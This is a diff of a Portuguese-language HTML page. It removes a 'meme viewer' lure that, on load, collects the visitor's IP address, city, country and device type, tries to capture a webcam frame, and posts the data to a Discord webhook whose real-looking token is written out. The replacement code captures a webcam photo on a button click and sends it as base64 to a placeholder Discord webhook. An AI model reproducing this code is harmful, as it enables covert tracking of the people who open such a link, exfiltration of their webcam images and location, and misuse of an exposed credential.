@@ -3,112 +3,83 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Visualizar Meme</title>
+  <title>Captura de Foto e Envio ao Discord</title>
   <style>
     body { font-family: sans-serif; margin: 0; background: #f4f4f4; padding: 20px; }
-    .meme-container { text-align: center; margin-bottom: 20px; }
-    .meme-container img, .meme-container video { max-width: 100%; height: auto; }
-    .info { text-align: center; margin-top: 20px; font-size: 16px; }
     .photo { margin-top: 20px; text-align: center; }
+    .btn-capture { background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
   </style>
 </head>
 <body>
-  <h2 style="text-align:center">Meme Visualizado</h2>
-  
-  <div class="meme-container">
-    <img id="memeImage" style="display:none;" />
-    <video id="memeVideo" controls style="display:none;">
-      <source id="videoSource" src="" type="video/mp4">
-    </video>
-  </div>
+  <h2 style="text-align:center">Capturar Foto e Enviar para o Discord</h2>
 
-  <div class="info">
-    <p id="info">Carregando dados...</p>
+  <div class="photo" id="photoContainer">
+    <button class="btn-capture" onclick="capturarFoto()">Capturar Foto</button>
   </div>
-
-  <div class="photo" id="photoContainer"></div>
 
   <script>
-    function detectarDispositivo(userAgent) {
-      if (/android/i.test(userAgent)) return "Android";
-      if (/iphone|ipad/i.test(userAgent)) return "iPhone/iPad";
-      if (/windows/i.test(userAgent)) return "Windows";
-      if (/macintosh|mac os/i.test(userAgent)) return "Mac";
-      if (/linux/i.test(userAgent)) return "Linux";
-      return "Desconhecido";
-    }
-
-    function exibirMeme(memeId) {
-      const img = document.getElementById("memeImage");
-      const vid = document.getElementById("memeVideo");
-      const source = document.getElementById("videoSource");
-
-      if (memeId === "meme1") {
-        img.src = "https://via.placeholder.com/300x200.png?text=Meme+1";
-        img.style.display = "block";
-        vid.style.display = "none";
-      } else if (memeId === "meme2") {
-        source.src = "https://www.w3schools.com/html/mov_bbb.mp4";
-        vid.load();
-        vid.style.display = "block";
-        img.style.display = "none";
-      } else {
-        document.getElementById("info").innerText = "Meme não encontrado!";
-      }
-    }
-
+    // Função para capturar a foto e convertê-la para base64
     function capturarFoto() {
-      const container = document.getElementById('photoContainer');
-      const video = document.createElement('video');
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
+      const video = document.createElement("video");
+      const photoContainer = document.getElementById("photoContainer");
 
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          video.srcObject = stream;
-          video.play();
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        video.srcObject = stream;
+        video.play();
 
-          video.onloadeddata = () => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const img = new Image();
-            img.src = canvas.toDataURL('image/png');
-            container.appendChild(img);
-            stream.getTracks().forEach(track => track.stop());
-          };
-        })
-        .catch(() => {
-          container.innerHTML = "<p>Não foi possível acessar a câmera.</p>";
-        });
+        const canvas = document.createElement("canvas");
+        const context = canvas.getContext("2d");
+
+        video.onloadedmetadata = () => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imgData = canvas.toDataURL("image/png"); // Converte para base64
+
+          // Exibe a foto na página
+          const img = new Image();
+          img.src = imgData;
+          photoContainer.innerHTML = ""; // Limpa o conteúdo anterior
+          photoContainer.appendChild(img); // Exibe a imagem capturada
+
+          // Enviar a foto para o Discord via Webhook
+          enviarFotoParaDiscord(imgData);
+
+          // Para o vídeo e libera o stream
+          stream.getTracks().forEach(track => track.stop());
+        };
+      }).catch(() => {
+        photoContainer.innerHTML = "<p>Erro ao acessar a câmera.</p>";
+      });
     }
 
-    fetch("https://ipapi.co/json")
-      .then(res => res.json())
-      .then(data => {
-        const params = new URLSearchParams(window.location.search);
-        const meme = params.get("meme");
-        const ref = params.get("ref");
-        const userAgent = navigator.userAgent;
-        const dispositivo = detectarDispositivo(userAgent);
-        const dataHora = new Date().toLocaleString();
-
-        document.getElementById("info").innerHTML =
-          `Meme: ${meme}<br>Referência: ${ref}<br>IP: ${data.ip}<br>` +
-          `Local: ${data.city}, ${data.country_name}<br>` +
-          `Dispositivo: ${dispositivo}<br>Data/Hora: ${dataHora}`;
-
-        exibirMeme(meme);
-        capturarFoto();
-
-        fetch("https://discord.com/api/webhooks/1371164024217272490/oy4D3DFmXtlobnD2QYi11LU_izNCXp5NmYPMCMmiP1Q28XrvC6UCMCiiRzTfQM_iMpb3", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            content: `**Novo acesso ao meme:**\nMeme: ${meme}\nRef: ${ref}\nIP: ${data.ip}\nLocal: ${data.city}, ${data.country_name}\nDispositivo: ${dispositivo}\nData/Hora: ${dataHora}`
-          })
-        });
+    // Função para enviar a foto capturada ao Discord
+    function enviarFotoParaDiscord(imgData) {
+      fetch("https://discord.com/api/webhooks/YOUR_WEBHOOK_URL", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: "Aqui está a foto capturada:",
+          embeds: [
+            {
+              image: {
+                url: imgData // Envia a imagem em formato base64
+              }
+            }
+          ]
+        })
+      }).then(response => {
+        if (response.ok) {
+          console.log("Foto enviada com sucesso!");
+        } else {
+          console.log("Erro ao enviar a foto.");
+        }
+      }).catch(error => {
+        console.log("Erro ao fazer requisição:", error);
       });
+    }
   </script>
 </body>
 </html>
